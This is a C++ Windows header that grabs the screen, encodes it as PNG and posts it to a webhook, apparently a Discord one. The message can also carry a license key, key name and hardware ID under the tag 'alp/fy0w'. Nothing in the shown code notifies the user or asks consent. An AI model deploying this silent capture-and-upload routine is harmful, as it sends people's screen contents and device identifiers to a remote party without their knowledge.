#pragma once
#include <Windows.h>
#include <string>
#include <vector>
#include <winhttp.h>
#pragma push_macro("byte")
#define byte unsigned char
#include <gdiplus.h>
#pragma pop_macro("byte")

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdiplus.lib")

namespace Screenshot {
    inline ULONG_PTR gdiplusToken = 0;

    inline void InitGDIPlus() {
        if (gdiplusToken) return;
        Gdiplus::GdiplusStartupInput input;
        Gdiplus::GdiplusStartup(&gdiplusToken, &input, NULL);
    }

    inline void ShutdownGDIPlus() {
        if (gdiplusToken) {
            Gdiplus::GdiplusShutdown(gdiplusToken);
            gdiplusToken = 0;
        }
    }

    inline int GetPNGEncoderClsid(CLSID* pClsid) {
        UINT num = 0, size = 0;
        Gdiplus::GetImageEncodersSize(&num, &size);
        if (size == 0) return -1;
        std::vector<BYTE> buf(size);
        Gdiplus::ImageCodecInfo* pICI = (Gdiplus::ImageCodecInfo*)buf.data();
        Gdiplus::GetImageEncoders(num, size, pICI);
        for (UINT i = 0; i < num; i++) {
            if (wcscmp(pICI[i].MimeType, L"image/png") == 0) {
                *pClsid = pICI[i].Clsid;
                return 0;
            }
        }
        return -1;
    }

    inline std::string CaptureScreenAsPNG() {
        InitGDIPlus();

        int w = 1920, h = 1080;
        HDC hScreenDC = GetDC(NULL);
        HDC hMemDC = CreateCompatibleDC(hScreenDC);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, w, h);
        HBITMAP hOld = (HBITMAP)SelectObject(hMemDC, hBitmap);
        BitBlt(hMemDC, 0, 0, w, h, hScreenDC, 0, 0, SRCCOPY);
        SelectObject(hMemDC, hOld);

        Gdiplus::Bitmap* bitmap = Gdiplus::Bitmap::FromHBITMAP(hBitmap, NULL);

        CLSID pngClsid;
        GetPNGEncoderClsid(&pngClsid);

        IStream* pStream = NULL;
        CreateStreamOnHGlobal(NULL, TRUE, &pStream);

        bitmap->Save(pStream, &pngClsid, NULL);

        STATSTG stat;
        pStream->Stat(&stat, STATFLAG_NONAME);
        size_t size = (size_t)stat.cbSize.QuadPart;

        LARGE_INTEGER zero = {};
        pStream->Seek(zero, STREAM_SEEK_SET, NULL);

        std::string png(size, 0);
        ULONG bytesRead = 0;
        pStream->Read(png.data(), (ULONG)size, &bytesRead);

        pStream->Release();
        delete bitmap;
        DeleteObject(hBitmap);
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hScreenDC);

        return png;
    }

    inline bool SendScreenshot(const std::string& webhookUrl, const std::string& pngData, const std::string& key = "", const std::string& keyName = "", const std::string& hwid = "") {
        if (webhookUrl.empty() || pngData.empty()) return false;

        size_t protoEnd = webhookUrl.find("://");
        if (protoEnd == std::string::npos) return false;
        size_t hostStart = protoEnd + 3;
        size_t hostEnd = webhookUrl.find('/', hostStart);
        if (hostEnd == std::string::npos) return false;
        std::string host = webhookUrl.substr(hostStart, hostEnd - hostStart);
        std::string path = webhookUrl.substr(hostEnd);

        std::wstring wHost(host.begin(), host.end());
        std::wstring wPath(path.begin(), path.end());

        std::string boundary = "----alpFy0wBoundary" + std::to_string(GetTickCount64());

        time_t now = time(0);
        tm t;
        gmtime_s(&t, &now);
        char tsBuf[64];
        strftime(tsBuf, sizeof(tsBuf), "%Y-%m-%dT%H:%M:%SZ", &t);

        std::string fieldsJson = "";
        if (!key.empty() || !keyName.empty() || !hwid.empty()) {
            fieldsJson += ",\"fields\":[";
            bool firstField = true;
            if (!keyName.empty()) {
                fieldsJson += "{\"name\":\"Key Name\",\"value\":\"" + keyName + "\",\"inline\":true}";
                firstField = false;
            }
            if (!key.empty()) {
                if (!firstField) fieldsJson += ",";
                fieldsJson += "{\"name\":\"Key\",\"value\":\"" + key + "\",\"inline\":true}";
                firstField = false;
            }
            if (!hwid.empty()) {
                if (!firstField) fieldsJson += ",";
                fieldsJson += "{\"name\":\"HWID\",\"value\":\"||" + hwid + "||\",\"inline\":false}";
            }
            fieldsJson += "]";
        }

        std::string embedJson = "{\"embeds\":[{";
        embedJson += "\"color\":16766725,";
        embedJson += "\"title\":\"Screenshot Capture\",";
        embedJson += "\"description\":\"Automatic screenshot captured.\",";
        embedJson += "\"footer\":{\"text\":\"alp/fy0w\"},";
        embedJson += "\"timestamp\":\"" + std::string(tsBuf) + "\"";
        embedJson += fieldsJson;
        embedJson += "}]}";

        std::vector<char> body;
        auto appendStr = [&](const std::string& s) {
            body.insert(body.end(), s.begin(), s.end());
        };

        appendStr("--" + boundary + "\r\n");
        appendStr("Content-Disposition: form-data; name=\"payload_json\"\r\n");
        appendStr("Content-Type: application/json\r\n\r\n");
        appendStr(embedJson + "\r\n");
        appendStr("--" + boundary + "\r\n");
        appendStr("Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.png\"\r\n");
        appendStr("Content-Type: image/png\r\n\r\n");
        body.insert(body.end(), pngData.begin(), pngData.end());
        appendStr("\r\n--" + boundary + "--\r\n");

        std::string contentType = "Content-Type: multipart/form-data; boundary=" + boundary;
        std::wstring wContentType(contentType.begin(), contentType.end());

        HINTERNET hSession = WinHttpOpen(L"alp-fy0w/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return false;
        HINTERNET hConnect = WinHttpConnect(hSession, wHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wPath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

        BOOL sent = WinHttpSendRequest(hRequest, wContentType.c_str(), (DWORD)wContentType.size(), body.data(), (DWORD)body.size(), (DWORD)body.size(), 0);
        if (!sent) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

        WinHttpReceiveResponse(hRequest, NULL);
        char buf[512]; DWORD rd = 0;
        while (WinHttpReadData(hRequest, buf, sizeof(buf), &rd) && rd > 0) rd = 0;

        WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
        return true;
    }

    inline void CaptureAndSend(const std::string& url, const std::string& key = "", const std::string& keyName = "", const std::string& hwid = "") {
        if (url.empty()) return;
        std::string png = CaptureScreenAsPNG();
        SendScreenshot(url, png, key, keyName, hwid);
    }
}
